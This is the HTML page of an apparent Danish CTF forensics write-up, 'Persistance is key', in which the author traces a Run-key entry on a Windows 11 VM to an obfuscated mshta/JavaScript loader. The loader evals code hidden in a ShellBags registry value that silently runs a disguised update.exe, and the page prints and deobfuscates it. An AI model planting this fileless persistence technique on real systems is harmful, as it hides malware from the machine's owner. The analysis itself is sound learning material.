@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Persistance is key :: HiddenV0ice cybersec blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Challenge beskrivelse Jeg hentede et lille gratis program og min PC begyndte at opføre sig mærkligt.
+Så slettede det hurtigt igen, men det havde ingen effekt..
+Har jeg fået virus? 😱
+Hjælp! 😭 Hvorfor virker genstart ikke?
+Challenge handout Windows 11 VM.
+Løsning af challenge Givet var en Windows 11 VM. Først blev VM&rsquo;en importeret i Virtualbox, da VMware ikke formåede at starte den op korrekt.
+![[VM_screenshot.png]]
+Da beskrivelsen nævner en genstart ikke hjælper, samt at nogle tilfældige .txt filer pludseligt opstår sammen med lommeregneren, så blev de to destinationer tjekket i registeringseditoren: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run, da dette indikerer at et eller flere programmer automatisk bliver eksekveret ved opstart.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://localhost:1313/ctf/persistance-is-key/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/code.min.c4581949edab7810737609fc5568852bcd908945f14561e366dcd2300a370545.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terminal.min.233716b7556db88c9cdc4a5d3f04afbd471613691cf8443016581ca89f66e913.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="http://localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Persistance is key">
+<meta property="og:description" content="Challenge beskrivelse Jeg hentede et lille gratis program og min PC begyndte at opføre sig mærkligt.
+Så slettede det hurtigt igen, men det havde ingen effekt..
+Har jeg fået virus? 😱
+Hjælp! 😭 Hvorfor virker genstart ikke?
+Challenge handout Windows 11 VM.
+Løsning af challenge Givet var en Windows 11 VM. Først blev VM&rsquo;en importeret i Virtualbox, da VMware ikke formåede at starte den op korrekt.
+![[VM_screenshot.png]]
+Da beskrivelsen nævner en genstart ikke hjælper, samt at nogle tilfældige .txt filer pludseligt opstår sammen med lommeregneren, så blev de to destinationer tjekket i registeringseditoren: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run, da dette indikerer at et eller flere programmer automatisk bliver eksekveret ved opstart.
+" />
+<meta property="og:url" content="http://localhost:1313/ctf/persistance-is-key/" />
+<meta property="og:site_name" content="HiddenV0ice cybersec blog" />
+
+  <meta property="og:image" content="http://localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2026-03-23 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="http://localhost:1313/">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/ctf/persistance-is-key/">Persistance is key</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2026-03-23</time></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="http://localhost:1313/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/writeup/">writeup</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/forensics/">Forensics</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="challenge-beskrivelse">Challenge beskrivelse<a href="#challenge-beskrivelse" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Jeg hentede et lille gratis program og min PC begyndte at opføre sig mærkligt.<br>
+Så slettede det hurtigt igen, men det havde ingen effekt..</p>
+<p>Har jeg fået virus? 😱</p>
+<p>Hjælp! 😭 Hvorfor virker genstart ikke?</p>
+<h2 id="challenge-handout">Challenge handout<a href="#challenge-handout" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Windows 11 VM.</p>
+<h2 id="løsning-af-challenge">Løsning af challenge<a href="#løsning-af-challenge" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Givet var en Windows 11 VM. Først blev VM&rsquo;en importeret i Virtualbox, da VMware ikke formåede at starte den op korrekt.</p>
+<p>![[VM_screenshot.png]]</p>
+<p>Da beskrivelsen nævner en genstart ikke hjælper, samt at nogle tilfældige .txt filer pludseligt opstår sammen med lommeregneren, så blev de to destinationer tjekket i registeringseditoren:
+<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
+<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>, da dette indikerer at et eller flere programmer automatisk bliver eksekveret ved opstart.</p>
+<p>Den første destination gav ikke noget interessant, dog gav den anden destination dette:</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Name</th>
+          <th style="text-align: left">Type</th>
+          <th style="text-align: left">Data</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">System32</td>
+          <td style="text-align: left">Reg_SZ</td>
+          <td style="text-align: left">mshta.exe &ldquo;javascript:var s1=&ldquo;HKCU\&quot;;var s2=&ldquo;Software\&quot;;var gfd=&ldquo;1&rdquo;;var..</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">I data-kolonnen var et Powershell script:</td>
+          <td></td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">mshta</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;javascript:
+</span></span></span><span class="line"><span class="cl"><span class="s2">var s1=&#34;</span><span class="n">HKCU</span><span class="p">\\</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">var s2=&#34;</span><span class="n">Software</span><span class="p">\\</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">var s3=&#34;</span><span class="n">Microsoft</span><span class="p">\\</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">var s4=&#34;</span><span class="n">Windows</span><span class="p">\\</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">var s5=&#34;</span><span class="n">Shell</span><span class="p">\\</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">var s6=&#34;</span><span class="n">Bags</span><span class="p">\\</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">var gfd=&#34;</span><span class="mf">1</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">var s7=gfd+&#34;</span><span class="p">\\</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">var s8=&#34;</span><span class="n">Desktop</span><span class="p">\\</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">var s9=&#34;</span><span class="n">Profile</span><span class="s2">&#34;+gfd;
+</span></span></span><span class="line"><span class="cl"><span class="s2">var a4fh4r = eval;
+</span></span></span><span class="line"><span class="cl"><span class="s2">xo6=new%20ActiveXObject(&#34;</span><span class="n">WScript</span><span class="p">.</span><span class="n">Shell</span><span class="s2">&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">A8nnnngfg=xo6.RegRead(s1+s2+s3+s4+s5+s6+s7+s8+s9);a4fh4r(A8nnnngfg);
+</span></span></span><span class="line"><span class="cl"><span class="s2">close();&#34;</span>
+</span></span></code></pre></div><p><code>mshta.exe</code> står for Microsoft HTML Application og er en applikation brugt til at parse .hta filer.
+Dernæst ses det at den parserer obfuskeret Javascript, som bliver eksekveret. Ved at deobfuskere dette bliver det meget tydeligt hvad programmet gør:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">mshta</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;javascript: eval(new%20ActiveXObject(&#39;WScript.Shell&#39;).RegRead(&#39;HKCU\\Software\\Microsoft\\Windows\\Shell\\Bags\\1\\Desktop\\Profile1&#39;))&#34;</span>
+</span></span></code></pre></div><p>Den læser registerværdien liggende i <code>HKCU\Software\Microsoft\Windows\Shell\Bags\1\Desktop</code>. Efter at have tjekket lokationen, så findes Profile1&rsquo;s data:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">new</span> <span class="n">ActiveXObject</span><span class="p">(</span><span class="s2">&#34;WScript.Shell&#34;</span><span class="p">).</span><span class="py">Run</span><span class="p">(</span><span class="s2">&#34;%APPDATA%\\discord\\update.exe&#34;</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="n">true</span><span class="p">)</span>
+</span></span></code></pre></div><p>Samt blev der fundet en anden interessant registertype kaldt &ldquo;Secret_password&rdquo; med værdien <code>xSbRFPNuKpLeguYhiCAFcddbchSQMY</code>.</p>
+<p>Profile1 eksekverer altså en fil kaldt &ldquo;update.exe&rdquo;. Dernæst blev den fil overført til en anden VM med Kali Linux kørende.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ file update.exe 
+</span></span><span class="line"><span class="cl">update.exe: Zip archive data, made by v3.0 UNIX, extract using at least v2.0, last modified May <span class="m">23</span> <span class="m">2025</span> 09:42:12, uncompressed size 112174, <span class="nv">method</span><span class="o">=</span>deflate
+</span></span></code></pre></div><p>&ldquo;update.exe&rdquo; er altså en zip fil/indeholder en zip fil. Samt blev et kodeord fundet tidligere. I zipfilen lå en .png
+![[CTF/DDC Qualifiers/flag.png]]
+Dette gav flaget: DDC{M4gnific3nt-M4lwar3-R3mov4}</p>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
